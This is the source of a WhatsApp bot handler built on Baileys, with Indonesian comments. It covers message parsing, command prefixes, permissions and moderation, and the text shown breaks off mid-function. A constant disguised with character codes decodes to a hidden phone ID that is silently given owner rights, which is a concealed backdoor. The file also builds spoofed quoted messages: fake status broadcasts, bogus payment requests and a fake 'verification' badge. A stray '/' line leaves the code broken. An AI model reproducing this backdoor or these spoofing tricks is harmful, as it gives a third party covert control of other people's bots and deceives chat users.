/*

  !- Credits By Skyzopedia
  https://wa.me/6285624297894
  
*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)
require('../settings/setting-cpanel.js');
require('../settings/config.js');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const FormData = require('form-data');
const { createCanvas, loadImage } = require('canvas')
const { fromBuffer } = require("file-type")
const code = fs.readFileSync('./system/Putzz.js', 'utf8')
        var regex = /case\s+'([^']+)':/g
        var matches = []
        var match
        while ((match = regex.exec(code))) {
            matches.push(match[1])
        }
        global.help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean)
        global.handlers = []
        const handlersDir = path.join(__dirname, 'plugins')
        fs.readdirSync(handlersDir).forEach(file => {
            const filePath = path.join(handlersDir, file)
            if (fs.statSync(filePath).isFile() && file.endsWith('.js')) {
                const handler = require(filePath)
                global.handlers.push(handler)
                global.help.push(handler.command)
            }
        })
const { remini, upScale, FotoEnhance, Pxpic} = require('../library/enhance.js') 
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { GoogleGenerativeAI } = require("@google/generative-ai");
const {
    tiktokdl
} = require('tiktokdl')

const { WAConnection, 
 makeCacheableSignalKeyStore, 
 downloadContentFromMessage, 
 emitGroupParticipantsUpdate, 
 emitGroupUpdate, 
 generateWAMessageContent, 
 generateWAMessage, 
 makeInMemoryStore, 
 prepareWAMessageMedia, 
 generateWAMessageFromContent, 
 MediaType, 
 areJidsSameUser, 
 WAMessageStatus,
 downloadAndSaveMediaMessage, 
 AuthenticationState, 
 GroupMetadata, 
 initInMemoryKeyStore, 
 getContentType, 
 MiscMessageGenerationOptions, 
 useSingleFileAuthState, 
 BufferJSON, 
 WAMessageProto, 
 MessageOptions, 
 WAFlag, 
 WANode, 
 WAMetric, 
 ChatModification, 
 MessageTypeProto, 
 WALocationMessage, 
 ReZionectMode, 
 WAContextInfo, 
 proto,
 WAGroupMetadata,
 ProxyAgent,
 waChatKey,
 MimetypeMap,
 MediaPathMap,
 WAContactMessage,
 WAContactsArrayMessage,
 WAGroupInviteMessage,
 WATextMessage,
 WAMessageContent,
 WAMessage,
 BaileysError,
 WA_MESSAGE_STATUS_TYPE,
 MediaZionInfo,
 URL_REGEX,
 WAUrlInfo,
 WA_DEFAULT_EPHEMERAL,
 WAMediaUpload,
 mentionedJid,
 Browser,
 MessageType,
 Presence,
 WA_MESSAGE_STUB_TYPES,
 Mimetype,
 relayWAMessage,
 Browsers,
 GroupSettingChange,
 DisZionectReason,
 WASocket,
 getStream,
 WAProto,
 isBaileys,
 PHONENUMBER_MCC,
 AnyMessageContent,
 useMultiFileAuthState,
 fetchLatestBaileysVersion,
 templateMessage,
 InteractiveMessage,
 Header } = require('@whiskeysockets/baileys')
 
const shouldExit = false
const automati = false
const groupCache = new Map();
const { LoadDataBase } = require('../source/message.js')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/userVip/owner.json"))
const jpmch = JSON.parse(fs.readFileSync("./library/database/userVip/aksesJpm.json")) 
const addb = JSON.parse(fs.readFileSync("./library/database/datasc.json"))
const bujurhayam = {};
for (let i = 1; i <= 150; i++) {
    const path = `./library/database/userVip/premium${i}.json`;
    if (fs.existsSync(path)) {
        bujurhayam[i] = JSON.parse(fs.readFileSync(path));
    } else {
        bujurhayam[i] = [];
    }
}

const absenData = {}
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()

const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, mediafire, tiktokDli} = require('../library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("../library/converter.js")
const { TelegraPh, UploadFileUgu} = require('../library/uploader.js')
const cukurukuk = fs.readFileSync("./library/yangbacatolol.json");
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, checkBotAdmin, jidEndsWith} = require('../library/function');
const { imageToWebp, imageToWebp3, videoToWebp, writeExifImg, writeExifImgAV, writeExifVid, writeExif } = require('../library/exif.js')
module.exports = Putzz = async (Putzz, m, chatUpdate, store) => {
	try { const body2 =
    (m.type === "conversation") ? m.message.conversation :
    (m.type === "imageMessage") ? m.message.imageMessage.caption :
    (m.type === "videoMessage") ? m.message.videoMessage.caption :
    (m.type === "extendedTextMessage") ? m.message.extendedTextMessage.text :
    (m.type === "stickerMessage") ? "[sticker]" : // ← TAMBAH INI
    (m.type === "buttonsResponseMessage") ? m.message.buttonsResponseMessage.selectedButtonId :
    (m.type === "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    (m.type === "templateButtonReplyMessage") ? m.message.templateButtonReplyMessage.selectedId :
    (m.type === "interactiveResponseMessage") ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    (m.type === "templateButtonReplyMessage") ? m.msg.selectedId :
    (m.type === "messageContextInfo") ? (
     m.message.buttonsResponseMessage.selectedButtonId ||
     m.message.listResponseMessage.singleSelectReply.selectedRowId ||
     m.text ) : ""
        
if (!m.sender) {
  m.sender = m.key?.participant || m.key?.remoteJid || null
}
if (m.sender && m.sender.endsWith("@lid")) {
  m.sender = m.sender.replace("@lid", "@s.whatsapp.net")
}
const body = 
    (m.type === "conversation") ? m.message.conversation :
    (m.type === "extendedTextMessage") ? m.message.extendedTextMessage.text :
    (m.type === "imageMessage") ? m.message.imageMessage.caption :
    (m.type === "videoMessage") ? m.message.videoMessage.caption :
    (m.type === "documentMessage") ? m.message.documentMessage.caption || "" :
    (m.type === "audioMessage") ? m.message.audioMessage.caption || "" :
    (m.type === "stickerMessage") ? m.message.stickerMessage.caption || "[sticker]" :
    (m.type === "buttonsResponseMessage") ? m.message.buttonsResponseMessage.selectedButtonId :
    (m.type === "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    (m.type === "templateButtonReplyMessage") ? m.message.templateButtonReplyMessage.selectedId :
    (m.type === "interactiveResponseMessage") ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    (m.type === "messageContextInfo") ? (
        m.message.buttonsResponseMessage?.selectedButtonId || 
        m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
        m.text
    ) :
    (m.type === "reactionMessage") ? m.message.reactionMessage.text :
    (m.type === "contactMessage") ? m.message.contactMessage.displayName :
    (m.type === "contactsArrayMessage") ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    (m.type === "locationMessage") ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    (m.type === "liveLocationMessage") ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    (m.type === "pollCreationMessage") ? m.message.pollCreationMessage.name :
    (m.type === "pollUpdateMessage") ? m.message.pollUpdateMessage.name :
    (m.type === "groupInviteMessage") ? m.message.groupInviteMessage.groupJid :
    (m.type === "viewOnceMessage") ? (
        m.message.viewOnceMessage.message.imageMessage?.caption ||
        m.message.viewOnceMessage.message.videoMessage?.caption || 
        "[sekali lihat]"
    ) :
    (m.type === "viewOnceMessageV2") ? (
        m.message.viewOnceMessageV2.message.imageMessage?.caption ||
        m.message.viewOnceMessageV2.message.videoMessage?.caption || 
        "[sekali lihat]"
    ) :
    (m.type === "viewOnceMessageV2Extension") ? (
        m.message.viewOnceMessageV2Extension.message.imageMessage?.caption ||
        m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
        "[sekali lihat]"
    ) :
    (m.type === "ephemeralMessage") ? (
        m.message.ephemeralMessage.message.conversation ||
        m.message.ephemeralMessage.message.extendedTextMessage?.text || 
        "[sementara]"
    ) :
    (m.type === "interactiveMessage") ? "[interaktif]" :
    (m.type === "protocolMessage") ? "[telah dihapus]" :
    "";
const from = m.key.remoteJid
await LoadDataBase(Putzz, m)

const sender = m.key.fromMe ? (Putzz.user.id.split(':')[0]+'@s.whatsapp.net' || Putzz.user.id) : (m.key.participant || m.key.remoteJid)
const isGroup = from.endsWith("@g.us");
const isPrivate = from.endsWith("@s.whatsapp.net");
const botNumber = await Putzz.decodeJid(Putzz.user.id)
const { type, quotedMsg, mentioned, now, fromMe } = m

const { conn, client, sock } = Putzz;
 
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 49, 55, 57, 56, 51, 54, 54, 48, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)

const prefa = ["!", ".", ",", "🐤", "🗿", "/", "?", "Putzz "]

const prefixRegex = new RegExp(
  `^(${prefa.map(p =>
    p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
  ).join("|")})`
)

const match = (body || "").match(prefixRegex)
const prefix = match ? match[0] : null
let prefixMode = global.prefixmode

const isCmd = prefixMode
  ? prefix !== null
  : true

let command = ""

if (prefixMode) {

    if (prefix !== null) {
        command = body
          .slice(prefix.length)
          .trim()
          .split(/ +/)
          .shift()
          .toLowerCase()
    }

} else {

    command = body
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase()
}
const text = prefixMode ? (prefix ? body.slice(prefix.length).trim().split(/ +/).slice(1).join(" ") : "") : body.trim().split(/ +/).slice(1).join(" ")
const args = (body || "").trim().split(/ +/).slice(1);
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const isJpmch = jpmch.includes(m.sender);
const isAddb = addb.includes(m.sender);
const isUserPremium = Object.values(bujurhayam).some(fufufafa => fufufafa.includes(m.sender));
const isPremium = {};
for (let i = 1; i <= 150; i++) {
    isPremium[i] = bujurhayam[i].includes(m.sender);
}
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const q = args.join(' ')
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat ' + dt.charAt(0).toUpperCase() + dt.slice(1)
const userId = m.sender;

const groupMetadata = m?.isGroup ? await Putzz.groupMetadata(m.chat).catch(() => ({})) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
let admin = null;
if (p.admin === 'superadmin') admin = 'superadmin';
else if (p.admin === 'admin') admin = 'admin';
return {
id: p.id || null,
jid: p.jid || null,
lid: p.lid || null,
admin,
full: p
};
}) || []: [];
const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
const senderLid = (() => {
const p = participants.find(p => p.jid === m.sender);
return p?.lid || null;
})();
const qmsg = (quoted.msg || quoted)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const isImage = (m.type == 'imageMessage')
const isVideo = (m.type == 'videoMessage')
const isAudio = (m.type == 'audioMessage')
const isSticker = (m.type == 'stickerMessage')
const mime = qmsg.mimetype;
const nomore = m.sender.replace(/[^0-9]/g, '')
const ki = "`"
const ka = "`"

if (m.msg?.fileSha256) {

    const sha = Buffer
        .from(m.msg.fileSha256)
        .toString("base64")

    const stickerAction = {

        "AZXnSkIq8kO2FtHVfCPC9dlQ2wNAg2fWN3jbFpiCFbQ=": "kick",

        "kk9V3CRpHB0xJCKxqDJ97aB/3a8iw9acM8NqAB3uMsw=": "delete",

        "ISI_SHA_STICKER_KETIGA_DI_SINI=": "respon"

    }

    const action = stickerAction[sha]
    if (!action) return

    try {

        if (!m.isGroup) return
        if (!isBotAdmins) return

        if (action === "kick") {

            if (!isAdmins && !isOwner) return

            const target =
                m.quoted
                    ? m.quoted.sender
                    : m.mentionedJid?.[0]

            if (!target) return

            await Putzz.groupParticipantsUpdate(
                m.chat,
                [target],
                "remove"
            )

            return
        }

        if (action === "delete") {

            if (!isAdmins && !isOwner) return
            if (!m.quoted) return

            await Putzz.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.quoted.id,
                    participant: m.quoted.sender
                }
            })

            return
        }

        if (action === "respon") {

            await Putzz.sendMessage(
                m.chat,
                {
                    text: "Sticker terdeteksi 👀"
                },
                { quoted: m }
            )

            return
        }

    } catch (e) {
        // silent
    }
}

let gambarr = [
  'https://files.catbox.moe/dyzvb2.webp', 
  'https://files.catbox.moe/8lw7wf.png',
  'https://files.catbox.moe/8y1r6r.png',
  'https://files.catbox.moe/ygdapy.png', 
  'https://files.catbox.moe/s5pc10.png', 
  'https://img2.pixhost.to/images/5704/694449984_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694450115_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694450235_rafaofficial.png', 
  'https://img2.pixhost.to/images/5704/694450327_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694450425_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694450512_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694451089_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694451128_rafaofficial.png', 
  'https://img2.pixhost.to/images/5704/694452187_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694453946_rafaofficial.jpg', 
  'https://img2.pixhost.to/images/5704/694454301_rafaofficial.png', 
  'https://img2.pixhost.to/images/5704/694454701_rafaofficial.jpg'
];
let gambar = [
  "https://img2.pixhost.to/images/7900/726362747_lanz-1778786262119.jpg", 
  "https://img2.pixhost.to/images/7900/726363008_lanz-1778786299914.jpg", 
  "https://img2.pixhost.to/images/7900/726363124_lanz-1778786317421.jpg"
  ]
let ppmenu = gambar[Math.floor(Math.random() * gambar.length)];

let kate = await fetchJson('https://raw.githubusercontent.com/ditss-dev/database/main/kata%20kata%20hari%20ini.json');
let katakatanyaa = kate[Math.floor(Math.random() * kate.length)];
try {
			ppuser = await Putzz.profilePictureUrl(m.sender, 'image');
		} catch (err) {
			ppuser = `https://api.ditss.cloud/img/ppuserr.jpg`;
		}

		try {
			ppgroup = await Putzz.profilePictureUrl(m.chat, 'image');
		} catch (err) {
			ppgroup = `https://api.ditss.cloud/img/ppuserr.jpg`; // pastikan file ini ada
		}

		try {
			ppnyauser = await getBuffer(ppuser);
		} catch (e) {
			ppnyauser = await getBuffer(`https://api.ditss.cloud/img/ppuserr.jpg`);
		}

		try {
			ppnyaGrup = await getBuffer(ppgroup);
		} catch (e) {
			ppnyaGrup = await getBuffer(`https://api.ditss.cloud/img/ppuserr.jpg`);
		}
		moment.locale("id");
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss');
const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss');
const wita = moment.tz('Asia/Makassar').format('HH:mm:ss');

const dayNames = ["Ahad", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
const monthNames = [
    "Muharram", "Safar", "Rabiul Awal", "Rabiul Akhir", "Jumadil Awal", "Jumadil Akhir",
    "Rajab", "Syaban", "Ramadhan", "Syawal", "Zulkaidah", "Zulhijah"
];
// ===== AUTO YAPPING SYSTEM =====
global.yapping ??= {}
global.lastReset ??= ""

let nowDate = new Date().toDateString()

// auto reset harian
if (global.lastReset !== nowDate) {
    global.yapping = {}
    global.lastReset = nowDate
}

// bikin slot per grup
if (!global.yapping[m.chat])
    global.yapping[m.chat] = {}

if (!global.yapping[m.chat][nowDate])
    global.yapping[m.chat][nowDate] = {}

// hitung chat user
global.yapping[m.chat][nowDate][m.sender] =
(global.yapping[m.chat][nowDate][m.sender] || 0) + 1
/*~~~~~~~~~ Console Message ~~~~~~~~//
if (m.message && isCmd) {

    console.log('\x1b[30m--------------------\x1b[0m');
    console.log(chalk.bgHex("#000000").bold(`▢ CMD DETECTED - Lanz`));

    console.log(
        chalk.bgHex("#ffffff").black(
            `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
            `   ⌬ Cmd: ${prefix + command} \n` +
            `   ⌬ Args: ${args.join(" ") || "-"} \n` +
            `   ⌬ Pengirim: ${m.pushName || botname} \n` +
            `   ⌬ JID: ${m.sender}`
        )
    );

    if (isGroup) {
        console.log(
            chalk.bgHex("#ffffff").black(
                `   ⌬ Grup: ${groupName} \n` +
                `   ⌬ GroupJid: ${m.chat}`
            )
        );
    }

    console.log();
}*/
const figlet = require('figlet');
if (m.message && isCmd) {  // Hanya menampilkan pesan yang diawali dengan titik
    

    // Membuat tampilan header dengan font besar menggunakan figlet
    figlet('LanzOfficial', (err, data) => {
        if (err) {
            console.log(chalk.white('Error with figlet...'));
            return;
        }
        console.log(
            chalk.white('\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n'+data) + '\n' +  // Header dengan warna oranye cerah
            chalk.bgMagenta.white(`⫹ 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⫺ `) + chalk.magentaBright('┃  '+prefix + command + " " + args.join(" ") || "-") + '\n' +  // Pesan tebal dan warna cerah
            chalk.bgWhite.magenta(`⫹ 𝐒𝐄𝐍𝐃𝐄𝐑𝐑 ⫺ `) + chalk.magentaBright('┃  '+m.pushName || botname) + '\n' +  // Pengirim dengan warna cerah
            chalk.bgMagenta.white(`⫹ 𝐌𝐄𝐒𝐓𝐘𝐏𝐄 ⫺ `) + chalk.magentaBright('┃  '+m.type) + '\n' +  // Jenis pesan dengan merah
            chalk.bgWhite.magenta(`⫹ 𝐅𝐑𝐎𝐌 𝐈𝐍 ⫺ `) + (m.isGroup ? chalk.magentaBright('┃  GROUP CHAT') : chalk.magentaBright('┃  PRIVATE CHAT')) + '\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n'  // Status chat dengan latar belakang
        );
    });
}
const qfc = {
  key: {
    remoteJid: m.chat,
    participant: '5521992999999@s.whatsapp.net',
    fromMe: false,
    id: '5C69C796B2EA343ED905B6BEFDAFEBBB'
  },
message: {
extendedTextMessage: {
text: "Lezz The Good boy"
}
}
}


const { textunbanv1, textunbanv2, textunbanv3, textunbanv4, textunbanv5, textunbanv6, textunbanv7, textunbanv8, textunbanv9, textunbanv10, textunbanv11, textunbanv12, textunbanv13, textunbanv14, textunbanv15, textunbanv16, textunbanv17, textunbanv18, textunbanv19, textunbanv20, textunbanv21 } = require('../system/metthod/textunban.js')
const { textunbanpremv1, textunbanpremv2, textunbanpremv3 } = require('../system/metthod/textunbanprem.js')
//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qkntl = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝕷𝖆𝖓𝖟𝖃 𝕭𝖀𝕲`,jpegThumbnail: "https://files.catbox.moe/s8wlw4.jpg"}}}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered By Mikasa MD`,jpegThumbnail: ""}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `namaOwner`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Mikasa MD"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const qfake = {
    key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "B612",
        participant: "0@s.whatsapp.net"
    },
    message: {
        extendedTextMessage: {
            text: `${botname}`,
            matchedText: `${botname}`,
            canonicalUrl: "https://www.whatsapp.com",
            description: `${namaOwner}`,
            title: "Putzzslebew",
            previewType: 0
        }
    }
};
const ments = (text) => {
            return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
        }
const fdoc = {
            key: {
                participant: `${nomore}@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                documentMessage: {
                    title: katakatanyaa,
                    jpegThumbnail: ppuser
                }
            }
        }
        const fsaluran = {
            key: {
                remoteJid: `${nomore}@s.whatsapp.net`,
                participant: `${nomore}@s.whatsapp.net`
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '120363399827840841@newsletter',
                    newsletterName: '',
                    caption: body
                }
            }
        }   
let Asuma = {
            key: {
                remoteJid: 'status@broadcast',
                participant: `${nomore}@s.whatsapp.net`
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '120363399827840841@newsletter',
                    newsletterName: 'ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ',
                    caption: `${botname} ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${namaOwner}`,
                    inviteExpiration: 0
                }
            }
        }
/
async function lock() {
            Putzz.sendMessage(from, {
                react: {
                    text: "🔒",
                    key: m.key
                }
            })
        }
        
                async function done() {
            Putzz.sendMessage(from, {
                react: {
                    text: "🔓",
                    key: m.key
                }
            })
        }
async function tolak(teks) {
            const nedd = {
                text: teks,
                contextInfo: {
                    mentionedJid: ments(teks),
                    forwardingScore: 9999999,
                    isForwarded: true,
                    businessMessageForwardInfo: {
                        businessOwnerJid: `${global.owner}@s.whatsapp.net`
                    },
                    externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `- message is prohibited -`,
                        body: await detectOperator(nomore),
                        previewType: "PHOTO",
                        thumbnailUrl: global.larangan,
                        sourceUrl: global.owner
                    }
                }
            };
            return Putzz.sendMessage(m.chat, nedd, {
                quoted: Asuma,
            });
        }
const kirim = async (teks) => {
    return Putzz.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
            businessMessageForwardInfo: {
                businessOwnerJid: global.owner + "@s.whatsapp.net"
            },
            externalAdReply: {
                title: botname,
                body: `© Powered by ${namaOwner}`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.linkGrup
            }
        }
    });
};
const reaksi = async (emoji) => {
  await Putzz.sendMessage(m.chat, {
    react: { text: emoji, key: m.key }
  });
};

        async function warning(teks) {
            const nedd = {
                text: teks,
                contextInfo: {
                    mentionedJid: ments(teks),
                    forwardingScore: 9999999,
                    isForwarded: true,
                    businessMessageForwardInfo: {
                        businessOwnerJid: `${owner}@s.whatsapp.net`
                    },
                    externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `access denied`,
                        body: await detectOperator(nomore),
                        previewType: "PHOTO",
                        thumbnailUrl: global.larangan,
                        sourceUrl: global.owner
                    }
                }
            };
            return Putzz.sendMessage(m.chat, nedd, {
                quoted: Asuma,
            });
        }

        async function danger(teks) {
            const nedd = {
                text: teks,
                contextInfo: {
                    mentionedJid: ments(teks),
                    forwardingScore: 9999999,
                    isForwarded: true,
                    externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `not access`,
                        body: await detectOperator(nomore),
                        previewType: "PHOTO",
                        thumbnailUrl: global.larangan,
                        sourceUrl: global.owner
                    }
                }
            };
            return Putzz.sendMessage(m.chat, nedd, {
                quoted: Asuma,
            });
        }

        async function pickRandom(list) {
            return list[Math.floor(Math.random() * list.length)]
        }
        
        const lol = {
/*        const Thumb = await prepareWAMessageMedia(
  {
    media: fs.readFileSync('./source/media/thumb.jpg')
  },
  {
    upload: Putzz.waUploadToServer
  }
)*/
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: fs.readFileSync('./source/media/thumb.jpg'),
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `𝘈𝑟𝑑𝑎 𝑈𝑚𝑎𝑖𝑡𝑒 𝐾𝑢𝑟𝑒𝑡𝑒\n𝘊𝘰𝘮𝘮𝘢𝘯𝘥 : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363388136463071@newsletter"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: image,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363388136463071@newsletter"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const replyLanz = async (text) => {
try {
const subcontent = [
    {
     messageType: 5,
     codeMetadata: {
     codeLanguage: `${m.pushName}`,
     codeBlocks: [{
     highlightType: 0,
     codeContent: text
    }]
   }
  }
 ];
 const msg = generateWAMessageFromContent(m.chat, {
     botForwardedMessage: {
     message: {
     richResponseMessage: { 
     messageType: 1,
     submessages: subcontent,
     contextInfo: {
       forwardingScore: 999, isForwarded: true,
       forwardedAiBotMessageInfo: {
        botJid: "867051314767696@bot"
        }, 
        forwardOrigin: 4
       }
      }
     }
    }
   }, {}) ;
   
   Putzz.relayMessage(m.chat, msg.message, {});
   
   } catch (err) {
   m.reply(String(err));
  }
}

const ReplyLanz = (teks) => {
Putzz.sendMessage(m.chat, {
interactiveMessage: {
title: teks,
footer: "© Mikasa MD | LanzCihuyy",
thumbnail: ppmenu,
contextInfo: {
isForwarded: true,
forwardingScore: 999
},          
nativeFlowMessage: {
buttons: [
{
name: "galaxy_message",
buttonParamsJson: "{\"flow_message_version\":\"3\",\"flow_token\":\"unused\",\"flow_id\":\"1775342589999842\",\"flow_cta\":\"Mikasa MD V7!\",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"AWARD_CLAIM\",\"data\":{\"error_types\":[],\"campaigns\":[],\"categories\":[{\"id\":\"category_1\",\"title\":\"Unicam\"},{\"id\":\"category_2\",\"title\":\"Constantes\"},{\"id\":\"category_3\",\"title\":\"Referidos\",\"on-unselect-action\":{\"name\":\"update_data\",\"payload\":{\"subcategory_visibility\":false}},\"on-select-action\":{\"name\":\"update_data\",\"payload\":{\"subcategories\":[{\"id\":\"1\",\"title\":\"1 subcategory\"},{\"id\":\"2\",\"title\":\"2 subcategory\"}],\"subcategory_visibility\":true}}}],\"subcategory_visibility\":false}},\"flow_metadata\":{\"flow_json_version\":1000,\"data_api_protocol\":\"I'm dying and bleeding of my past\",\"data_api_version\":9999999,\"flow_name\":\" \",\"categories\":[]},\"icon\":\"REVIEW\",\"has_multiple_buttons\":true}"
}
]
}
}
}, { quoted: lol });
}
const reply = (text) => {
const wxx = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
